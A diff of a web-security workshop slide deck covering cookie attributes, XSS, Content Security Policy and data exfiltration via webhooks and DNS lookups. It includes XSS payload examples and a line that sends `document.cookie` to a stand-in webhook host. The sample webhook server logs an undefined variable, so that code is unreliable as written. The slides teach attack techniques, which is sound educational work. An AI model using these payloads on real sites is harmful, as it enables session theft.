@@ -39,6 +39,12 @@ style: |
     --color-prettylights-syntax-constant: var(--sapphire);
     --color-prettylights-syntax-entity-tag: var(--sapphire);
     --color-prettylights-syntax-entity: var(--lavender);
+    --color-prettylights-syntax-storage-modifier-import: var(--pink);
+  }
+  
+  a {
+    color: var(--teal);
+    text-decoration: underline;
   }
 
   section {
@@ -123,6 +129,18 @@ style: |
 
 ---
 
+# Before We Start
+
+- These slides are hosted at `cerealsoup.local`
+
+- All `cerealsoup.local:PORT` links are *only* accessible through our router 
+
+> Ask me if you're interested why ( ´ ▽ ` ).｡ｏ♡
+
+
+
+---
+
 # Overview
 
 0. Anatomy of a URL 
@@ -181,7 +199,7 @@ http://www.libbabel.so:80/blog?sortBy=time#H7texFinals
 
 - Protocol for transmitting resources 
 - Follows classic _client-server_ model
-- _Stateless protocol_
+- _Stateless_ protocol
 - _Unencrypted_ by default
 
 ---
@@ -235,6 +253,16 @@ Priority: u=0, i
 - Browser sends using `Cookie` header
 
 ![bg left:40%](./assets/cookies.jpg)
+
+---
+
+### HTTP Cookie Properties (and nuances)
+
+- `SameSite` controls when cookies are sent with cross-site requests
+- `HttpOnly` controls if scripts can access cookies
+- `Secure` only send the cookies over https; they can still be set over http
+
+> (╭ರ_•́) Is `Secure` actually secure? Can you think of an attack vector?
 
 ---
 
@@ -364,13 +392,13 @@ X-Firefox-Spdy: h2
 
 # Those Who Came Before  
 
-A grave sin. A cover up. A forgotten trail.
+A grave sin. A cover up. A forgotten crossroad.
 
 <div class="wrapper"> 
 <div class="centerdiv">
 
 ```
-<HOST>:<PORT>
+cerealsoup.local:5000
 ```
 
 </div>
@@ -417,7 +445,7 @@ The ghosts have hidden themselves using mysterious hexes. Think you can find the
 <div class="centerdiv">
 
 ```
-<HOST>:<PORT>
+cerealsoup.local:3000
 ```
 
 </div>
@@ -463,10 +491,138 @@ document.getElementById('name').innerHTML = name;
 
 ---
 
+Other common ways of executing XSS:
+
+- Through inline scripts 
+
+```html
+<img src=X onerror="alert(1)" />
+```
+
+- Using `javascript:` URL scheme
+
+```html
+<a href="javascript:alert(1)">Click me</a>
+```
+
+- `data:` URI XSS
+
+```html
+<script src="data:text/javascript,alert(1)"></script>
+```
+
+
+---
+
 ## Content Security Policy (CSP)
 
-_Work in Progress_
+- Server puts restrictions on the server, on the type of resources (primarily JavaScript) that it can load
+
+- Set using the `Content-Security-Policy` response header
+
+###### Example 
+
+```http
+Content-Security-Policy: default-src 'self'; img-src 'self' example.com
+```
+
+---
+
+## CSP: Nonce
+
+- Scripts/styles should be restricted using a `nonce`
+
+- Random value that is embedded into `<script>` and `<style>` elements
+
+```http
+Content-Security-Policy: script-src 'nonce-416d1177-4d12-4e3b-b7c9-f6c409789fb8'
+```
+
+```html
+<script nonce="416d1177-4d12-4e3b-b7c9-f6c409789fb8"></script>
+```
+
+> (╭ರ_•́) What could go wrong here?
+
+---
+
+## CSP: Integrity using hashes
+
+- Server calculates and sends the verified hashes in the CSP header
+
+- Client recalculates the hashes to make sure nothing has been tampered
+
+- External scripts must also include `integrity` attribute
+
+```http
+Content-Security-Policy: script-src 'sha256-cd9827ad...'
+```
+
+> (づ｡◕‿‿◕｡)づ This seems more suitable for static sites 
+
+---
+
+# Data Exfiltration
+
+- Smuggling data out of places
+
+- Done using `webhooks` or `dnshooks` (checkout [webhook.site](https://webhook.site/))
+
+```js
+fetch(`https://my-webhook.com/?flag=${document.cookie}`)
+```
+
+> webhook.site is popularly used even in real attacks (。﹏。)
+![bg right:30%](./assets/op.png)
+
+---
+
+## Custom Webhooks
+
+- You can write and host your custom webhook servers 
+
+```ts 
+import type { BunRequest } from 'bun'
+
+Bun.serve({
+	port: 3000,
+	routes: {
+		'/l': (req: BunRequest) => {
+			const url = new URL(req.url)
+			const p = url.searchParams.get('l')
+			console.log(p, h)
+			return new Response('Ok')
+		},
+	},
+})
+```
+
+
+---
+
+## DNS Hooks
+
+- Leak data via subdomain resolution
+
+- Put base64 encoded data as the subdomain:
+`d2VpaWlpaWlpaWlp.my-hook.com`
+
+- Lookups can then be logged by server
+
+---
+
+# pwn.college 
+
+- XSS challenges from pwn.college
+
 
 ---
 
 # Thank You
+
+- If you have any doubts please feel free to ask
+
+- We're always available @ [our Discord server](https://discord.gg/kSmsPyxd93)
+
+![center w:300](./assets/frieren.webp)
+
